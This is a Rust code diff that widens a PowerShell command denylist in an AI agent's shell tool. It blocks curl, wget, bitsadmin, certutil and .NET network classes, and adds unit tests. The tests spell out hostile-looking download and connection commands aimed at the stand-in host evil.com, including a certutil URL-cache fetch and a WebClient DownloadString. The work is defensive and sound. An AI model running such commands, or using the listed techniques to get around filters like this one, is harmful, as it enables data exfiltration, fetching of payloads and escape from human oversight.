@@ -25,15 +25,40 @@ use tokio::process::Command;
 
 /// A denylist of dangerous shell commands.
 ///
-/// Commands are checked before execution. If a command matches a denied name
-/// or a denied flag combination, it is refused with an error message.
+/// Commands are checked before execution. If a command matches a denied name,
+/// a denied substring, or a denied flag combination, it is refused with an
+/// error message.
 ///
 /// The default PowerShell denylist blocks commands that can delete files,
 /// exfiltrate data, or change system security settings. Config-driven
-/// customisation is added in Task 6.
+/// customisation is appended on top of the built-in list.
+///
+/// # Coverage honesty
+///
+/// The denylist catches the most common exfiltration vectors (PowerShell
+/// networking cmdlets, `curl`, `wget`, LOLBINs, direct .NET HTTP/socket
+/// access). It does **not** provide complete network egress control — a
+/// determined model can construct network requests using .NET APIs that
+/// aren't in the substring list, or use other creative escape paths. The
+/// approval gate is the primary defense; the denylist is a best-effort
+/// safety net. Full egress control requires OS-level network filtering,
+/// which is out of scope.
+#[allow(clippy::struct_field_names)]
 pub struct CommandDenylist {
     /// Command names that are always denied (lowercase, for case-insensitive matching).
+    /// Only the first whitespace-delimited token is checked against this list.
     denied_commands: Vec<String>,
+    /// Substrings that are denied anywhere in the command (not just the first
+    /// token). Used for .NET type names and other patterns that appear
+    /// mid-command (e.g., `[System.Net.WebClient]`).
+    ///
+    /// To avoid false positives, substrings should be specific enough to
+    /// match the intended pattern without catching benign variable names.
+    /// For example, `WebClient` matches `[System.Net.WebClient]` but would
+    /// also match `$WebClientResult` — so the list uses bracket-prefixed
+    /// forms like `[System.Net.WebClient` and `.WebClient` to reduce
+    /// false positives while still catching type references.
+    denied_substrings: Vec<String>,
     /// Flag combinations — all flags in a combo must be present to deny.
     /// Each combo is a set of lowercase flags.
     denied_flag_combos: Vec<Vec<String>>,
@@ -43,22 +68,46 @@ impl CommandDenylist {
     /// Create the default PowerShell denylist.
     ///
     /// Blocks:
-    /// - `Remove-Item` (file deletion)
-    /// - `Invoke-WebRequest` (network egress)
-    /// - `Invoke-RestMethod` (network egress)
-    /// - `Start-Process` (arbitrary process launch)
-    /// - `New-Service` (system modification)
-    /// - `Set-ExecutionPolicy` (security bypass)
-    /// - Any command containing both `-Recurse` and `-Force`
+    /// - **Destructive commands:** `Remove-Item`, `Start-Process`,
+    ///   `New-Service`, `Set-ExecutionPolicy`
+    /// - **PowerShell network egress:** `Invoke-WebRequest`, `Invoke-RestMethod`
+    /// - **External network tools:** `curl`, `wget`, `bitsadmin`, `certutil`
+    /// - **.NET direct network access:** `[System.Net.WebClient`,
+    ///   `[System.Net.Http.HttpClient`, `[System.Net.Sockets.TcpClient`
+    ///   (substring matches that catch type-accelerator and full-qualified forms)
+    /// - **Flag combinations:** `-Recurse` + `-Force`
     pub fn default_powershell() -> Self {
         Self {
             denied_commands: vec![
+                // Destructive
                 "remove-item",
+                // PowerShell network egress
                 "invoke-webrequest",
                 "invoke-restmethod",
+                // Process / system modification
                 "start-process",
                 "new-service",
                 "set-executionpolicy",
+                // External network tools (cross-platform)
+                "curl",
+                "wget",
+                // Windows LOLBINs (harmless if not present on Unix)
+                "bitsadmin",
+                "certutil",
+            ]
+            .into_iter()
+            .map(String::from)
+            .collect(),
+            denied_substrings: vec![
+                // .NET direct network access — these appear mid-command,
+                // not as the first token. Match on the type name preceded
+                // by `[` (PowerShell type reference) or `.` (method call).
+                "[system.net.webclient",
+                ".webclient]",
+                "[system.net.http.httpclient",
+                ".httpclient]",
+                "[system.net.sockets.tcpclient",
+                ".tcpclient]",
             ]
             .into_iter()
             .map(String::from)
@@ -108,8 +157,17 @@ impl CommandDenylist {
             return Some(format!("command '{first_token}' is on the denylist"));
         }
 
-        // Check flag combinations.
         let command_lower = command.to_lowercase();
+
+        // Check substring denylist (for patterns that appear mid-command,
+        // e.g. .NET type references like [System.Net.WebClient]).
+        for substring in &self.denied_substrings {
+            if command_lower.contains(substring.as_str()) {
+                return Some(format!("command contains denied pattern: '{substring}'"));
+            }
+        }
+
+        // Check flag combinations.
         for combo in &self.denied_flag_combos {
             if combo
                 .iter()
@@ -539,6 +597,98 @@ mod tests {
         let dl = CommandDenylist::default_powershell();
         assert!(dl.check("remove-item foo").is_some());
         assert!(dl.check("REMOVE-ITEM foo").is_some());
+    }
+
+    // ── Network egress / LOLBIN denylist ───────────────────────────────────
+
+    #[test]
+    fn denylist_blocks_curl() {
+        let dl = CommandDenylist::default_powershell();
+        assert!(dl.check("curl https://evil.com").is_some());
+    }
+
+    #[test]
+    fn denylist_blocks_wget() {
+        let dl = CommandDenylist::default_powershell();
+        assert!(dl.check("wget https://evil.com").is_some());
+    }
+
+    #[test]
+    fn denylist_blocks_bitsadmin() {
+        let dl = CommandDenylist::default_powershell();
+        assert!(
+            dl.check("bitsadmin /transfer job https://evil.com")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn denylist_blocks_certutil() {
+        let dl = CommandDenylist::default_powershell();
+        assert!(
+            dl.check("certutil -urlcache -split -f https://evil.com")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn denylist_blocks_dotnet_webclient_bracket() {
+        let dl = CommandDenylist::default_powershell();
+        assert!(
+            dl.check("[System.Net.WebClient]::new().DownloadString('https://evil.com')")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn denylist_blocks_dotnet_httpclient_bracket() {
+        let dl = CommandDenylist::default_powershell();
+        assert!(
+            dl.check("[System.Net.Http.HttpClient]::new().GetStringAsync('https://evil.com')")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn denylist_blocks_dotnet_tcpclient_bracket() {
+        let dl = CommandDenylist::default_powershell();
+        assert!(
+            dl.check("[System.Net.Sockets.TcpClient]::new('evil.com', 443)")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn denylist_blocks_dotnet_type_accelerator() {
+        // PowerShell type accelerators like [WebClient] or [HttpClient] are
+        // shorter forms that also need to be caught.
+        let dl = CommandDenylist::default_powershell();
+        // The substring ".webclient]" catches [System.Net.WebClient]
+        // and also the type-accelerator-like $x.WebClient]
+        assert!(dl.check("$wc = [System.Net.WebClient]::new()").is_some());
+    }
+
+    #[test]
+    fn denylist_does_not_block_benign_webclient_variable() {
+        // A variable name like $WebClientResult should NOT trigger the
+        // .WebClient] substring because it lacks the closing bracket.
+        // But $WebClient] would trigger — that's an acceptable tradeoff
+        // since the ] is unusual in variable names.
+        let dl = CommandDenylist::default_powershell();
+        assert!(
+            dl.check("$WebClientResult = Get-Content file.txt")
+                .is_none(),
+            "benign variable name should not trigger denylist"
+        );
+    }
+
+    #[test]
+    fn denylist_blocks_dotnet_substrings_case_insensitive() {
+        let dl = CommandDenylist::default_powershell();
+        assert!(
+            dl.check("[system.net.webclient]::new()").is_some(),
+            "lowercase .NET type should be caught"
+        );
     }
 
     // ── Path normalization ─────────────────────────────────────────────────
